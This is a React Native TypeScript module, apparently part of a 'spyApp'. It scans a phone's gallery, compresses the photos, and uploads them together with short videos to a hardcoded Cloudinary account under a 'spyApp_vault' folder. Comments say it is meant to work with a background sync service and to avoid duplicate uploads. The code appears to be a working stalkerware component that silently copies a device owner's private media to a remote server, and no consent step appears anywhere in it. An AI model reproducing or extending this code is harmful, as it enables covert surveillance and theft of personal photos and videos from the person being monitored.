import { CameraRoll } from '@react-native-camera-roll/camera-roll';
import ImageResizer from '@bam.tech/react-native-image-resizer';
import axios from 'axios';

const CLOUD_NAME = 'dgbjpy7ev';
const UPLOAD_PRESET = 'sypapp';
const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;

// Uploaded fileIds ka persistent in-memory cache (app session ke dauran)
// Yeh Set BackgroundSyncService se share hoga - duplicate Cloudinary uploads rokne ke liye
const globalUploadedFileIds = new Set<string>();

export interface MediaItem {
  url: string;       // Cloudinary secure URL
  fileId: string;    // Original file ka unique identifier
  mediaType: string; // 'image' ya 'video'
}

export const scanAndUploadGallery = async (
  deviceId: string,
  sessionCache?: Set<string>, // BackgroundSyncService ka iteration-level cache (optional)
): Promise<MediaItem[]> => {
  try {
    const photos = await CameraRoll.getPhotos({
      first: 20,
      assetType: 'All',
      include: ['fileSize', 'filename', 'playableDuration'],
    });

    const uploadedItems: MediaItem[] = [];
    const targetFolder = `spyApp_vault/${deviceId}`;

    for (const edge of photos.edges) {
      const node = edge.node as any;
      const fileUri = node.image.uri;
      const isVideo = node.type && node.type.startsWith('video');

      // ─── UNIQUE FILE ID ────────────────────────────────────────────────────
      // Filename + size se ek unique ID banao (URI change ho sakti hai)
      const filename = node.image.filename || fileUri.split('/').pop() || '';
      const fileSize = node.image.fileSize || 0;
      const fileId = `${filename}_${fileSize}`;

      // ─── DUPLICATE CHECK (Global Cache) ───────────────────────────────────
      // Agar yeh file is session mein pehle hi upload ho chuki hai, skip karo
      if (globalUploadedFileIds.has(fileId)) {
        continue;
      }
      // Session-level cache bhi check karo (BackgroundSyncService se aata hai)
      if (sessionCache && sessionCache.has(fileId)) {
        continue;
      }

      // ─── VIDEO LIMIT: SIRF 60 SECONDS YA KAM ─────────────────────────────
      if (isVideo) {
        const duration = node.playableDuration || node.duration || 0;
        if (duration > 60) {
          // 1 minute se bari video - skip karo, agle pe move karo
          console.log(`Skipping long video: ${filename} (${Math.round(duration)}s > 60s)`);
          continue;
        }
      }

      // ─── IMAGE COMPRESSION ────────────────────────────────────────────────
      let processedUri = fileUri;
      if (!isVideo) {
        try {
          const resized = await ImageResizer.createResizedImage(
            fileUri,
            1280,
            1280,
            'JPEG',
            80,
            0,
            undefined,
          );
          processedUri = resized.uri;
        } catch (err) {
          console.error('Image compression failed:', err);
          // Compression fail ho to original use karo
        }
      }

      // ─── CLOUDINARY UPLOAD ────────────────────────────────────────────────
      try {
        const formData = new FormData();
        formData.append('file', {
          uri: processedUri,
          type: isVideo ? 'video/mp4' : 'image/jpeg',
          name: `${fileId}.${isVideo ? 'mp4' : 'jpg'}`, // Consistent name for Cloudinary dedup
        } as any);
        formData.append('upload_preset', UPLOAD_PRESET);
        formData.append('folder', targetFolder);
        // Cloudinary pe bhi same public_id rakho taake wahan bhi duplicate na ho
        formData.append('public_id', `${deviceId}_${fileId.replace(/[^a-zA-Z0-9_-]/g, '_')}`);

        const res = await axios.post(CLOUDINARY_URL, formData, {
          headers: { 'Content-Type': 'multipart/form-data' },
        });

        if (res.data.secure_url) {
          const item: MediaItem = {
            url: res.data.secure_url,
            fileId: fileId,
            mediaType: isVideo ? 'video' : 'image',
          };
          uploadedItems.push(item);

          // Dono caches mein add karo taake future iterations mein skip ho
          globalUploadedFileIds.add(fileId);
          if (sessionCache) sessionCache.add(fileId);
        }
      } catch (uploadErr: any) {
        // Agar Cloudinary 400 de (already exists), cache mein add karo aur skip
        if (uploadErr?.response?.status === 400 || uploadErr?.response?.status === 409) {
          console.log(`File already on Cloudinary, skipping: ${fileId}`);
          globalUploadedFileIds.add(fileId);
          if (sessionCache) sessionCache.add(fileId);
        } else {
          console.error(`Upload failed for ${fileId}:`, uploadErr?.message);
        }
      }
    }

    return uploadedItems;
  } catch (error) {
    console.error('Media pipeline error:', error);
    return [];
  }
};